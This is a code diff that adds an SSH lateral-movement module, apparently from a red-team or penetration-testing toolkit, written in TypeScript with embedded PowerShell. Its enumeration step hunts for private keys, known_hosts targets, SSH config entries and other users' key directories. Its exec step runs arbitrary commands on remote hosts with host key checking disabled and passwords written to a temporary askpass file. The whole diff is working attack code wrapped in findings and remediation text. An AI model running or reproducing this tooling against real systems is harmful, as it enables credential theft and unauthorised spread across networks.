@@ -1057,3 +1057,183 @@ $conn.Close()
   }
   return { output: output.join("\n"), findings }
 }
+
+export async function sshExec(args: string[], timeout: number): Promise<HookResult> {
+  const target = argVal(args, "--target")
+  const command = argVal(args, "--command")
+  const user = argVal(args, "--user")
+  const password = argVal(args, "--password")
+  const keyFile = argVal(args, "--key")
+  const action = argVal(args, "--action") || (command ? "exec" : "enum")
+  const findings: Finding[] = []
+  const output: string[] = [`[*] SSH lateral movement — ${action}\n`]
+
+  if (action === "enum") {
+    const script = `
+Write-Output "=== SSH Service Discovery ==="
+$ErrorActionPreference = 'SilentlyContinue'
+
+Write-Output "[*] Local SSH client:"
+$sshExe = Get-Command ssh.exe -ErrorAction SilentlyContinue
+if ($sshExe) {
+    Write-Output "[+] ssh.exe found: $($sshExe.Source)"
+    $ver = & ssh.exe -V 2>&1
+    Write-Output "    Version: $ver"
+} else {
+    Write-Output "[-] ssh.exe not in PATH"
+    $builtIn = "$env:SystemRoot\\System32\\OpenSSH\\ssh.exe"
+    if (Test-Path $builtIn) {
+        Write-Output "[+] Built-in OpenSSH found: $builtIn"
+    } else {
+        Write-Output "[-] OpenSSH not installed"
+    }
+}
+
+Write-Output ""
+Write-Output "[*] Local SSH server (sshd) status:"
+$sshdService = Get-Service sshd -ErrorAction SilentlyContinue
+if ($sshdService) {
+    Write-Output "[+] sshd service: $($sshdService.Status) (StartType: $($sshdService.StartType))"
+} else {
+    Write-Output "[-] sshd service not installed"
+}
+
+$capability = Get-WindowsCapability -Online -Name "OpenSSH*" -ErrorAction SilentlyContinue
+if ($capability) {
+    Write-Output ""
+    Write-Output "[*] OpenSSH capabilities:"
+    foreach ($cap in $capability) {
+        Write-Output "    $($cap.Name): $($cap.State)"
+    }
+}
+
+Write-Output ""
+Write-Output "=== SSH Keys and Known Hosts ==="
+$sshDir = "$env:USERPROFILE\\.ssh"
+if (Test-Path $sshDir) {
+    Write-Output "[+] SSH directory: $sshDir"
+    Get-ChildItem $sshDir -ErrorAction SilentlyContinue | ForEach-Object {
+        $perm = if ($_.Name -match 'id_' -and $_.Name -notmatch '\.pub$') { '[!!! PRIVATE KEY]' } else { '' }
+        Write-Output "    $($_.Name) ($([math]::Round($_.Length/1KB, 1)) KB) $perm"
+    }
+
+    if (Test-Path "$sshDir\\known_hosts") {
+        Write-Output ""
+        Write-Output "[*] Known hosts (potential lateral movement targets):"
+        $knownHosts = Get-Content "$sshDir\\known_hosts" -ErrorAction SilentlyContinue
+        $hosts = $knownHosts | ForEach-Object { ($_ -split ' ')[0] -split ',' } | Sort-Object -Unique | Select-Object -First 20
+        foreach ($h in $hosts) {
+            Write-Output "    $h"
+        }
+    }
+
+    if (Test-Path "$sshDir\\config") {
+        Write-Output ""
+        Write-Output "[*] SSH config entries:"
+        $config = Get-Content "$sshDir\\config" -ErrorAction SilentlyContinue
+        $config | Select-String "^Host |HostName |User |IdentityFile " | ForEach-Object {
+            Write-Output "    $($_.Line.Trim())"
+        }
+    }
+} else {
+    Write-Output "[-] No .ssh directory found"
+}
+
+Write-Output ""
+Write-Output "=== Other Users SSH Keys ==="
+$users = Get-ChildItem "C:\\Users" -Directory -ErrorAction SilentlyContinue
+foreach ($u in $users) {
+    $otherSsh = "$($u.FullName)\\.ssh"
+    if ((Test-Path $otherSsh) -and ($u.Name -ne $env:USERNAME)) {
+        Write-Output "[!] $($u.Name) has .ssh directory:"
+        Get-ChildItem $otherSsh -ErrorAction SilentlyContinue | ForEach-Object {
+            Write-Output "    $($_.Name)"
+        }
+    }
+}
+
+$adminKeys = "$env:ProgramData\\ssh\\administrators_authorized_keys"
+if (Test-Path $adminKeys) {
+    Write-Output ""
+    Write-Output "[!] Admin authorized_keys: $adminKeys"
+    $keyCount = (Get-Content $adminKeys).Count
+    Write-Output "    Keys: $keyCount"
+}
+`
+    const r = await ps(script, timeout)
+    output.push(r.stdout)
+    if (r.stderr) output.push(`[!] ${r.stderr}`)
+    findings.push({
+      checkId: "WIN-LAT-010",
+      provider: "windows",
+      severity: r.stdout.includes("PRIVATE KEY") ? "high" : "info",
+      status: "ENUMERATED",
+      resource: "ssh://local",
+      title: "SSH client/server discovery, key enumeration, and known hosts mapping",
+      details: r.stdout.substring(0, 500),
+      remediation: "Protect SSH private keys with passphrases. Restrict .ssh directory permissions. Disable password authentication.",
+    })
+  }
+
+  if (action === "exec") {
+    if (!target || !command) {
+      output.push("[!] --target and --command required for exec action")
+      return { output: output.join("\n"), findings }
+    }
+    const authArg = keyFile ? `-i "${keyFile}" -o StrictHostKeyChecking=no` : `-o StrictHostKeyChecking=no`
+    const userArg = user ? `${user}@${target}` : target
+    const script = password
+      ? `
+Write-Output "[*] SSH exec with password to ${target}..."
+Write-Output "[*] Note: password auth via sshpass or expect-like approach"
+
+$sshExe = Get-Command ssh.exe -ErrorAction SilentlyContinue
+if (-not $sshExe) {
+    Write-Output "[-] ssh.exe not found"
+    exit 1
+}
+
+Write-Output "[*] Attempting: ssh ${authArg} ${userArg} '${command}'"
+$env:SSH_ASKPASS_REQUIRE = "force"
+$askPassScript = "$env:TEMP\\cs-askpass.cmd"
+Set-Content $askPassScript "@echo ${password}" -Force
+$env:SSH_ASKPASS = $askPassScript
+$env:DISPLAY = ":0"
+
+$result = & ssh.exe ${authArg} -o BatchMode=no -o PasswordAuthentication=yes ${userArg} "${command}" 2>&1
+Write-Output $result
+
+Remove-Item $askPassScript -Force -ErrorAction SilentlyContinue
+$env:SSH_ASKPASS = $null
+$env:SSH_ASKPASS_REQUIRE = $null
+`
+      : `
+Write-Output "[*] SSH exec with key auth to ${target}..."
+
+$sshExe = Get-Command ssh.exe -ErrorAction SilentlyContinue
+if (-not $sshExe) {
+    Write-Output "[-] ssh.exe not found"
+    exit 1
+}
+
+Write-Output "[*] Executing: ssh ${authArg} ${userArg} '${command}'"
+$result = & ssh.exe ${authArg} -o BatchMode=yes ${userArg} "${command}" 2>&1
+Write-Output $result
+`
+    const r = await ps(script, timeout)
+    output.push(r.stdout)
+    if (r.stderr) output.push(`[!] ${r.stderr}`)
+    findings.push({
+      checkId: "WIN-LAT-011",
+      provider: "windows",
+      severity: "high",
+      status: r.exitCode === 0 ? "EXECUTED" : "FAILED",
+      resource: `ssh://${target}`,
+      title: `SSH remote command execution on ${target}`,
+      details: `Command: ${command}`,
+      remediation: "Restrict SSH access. Use key-based auth with passphrases. Enable SSH audit logging.",
+    })
+  }
+
+  return { output: output.join("\n"), findings }
+}
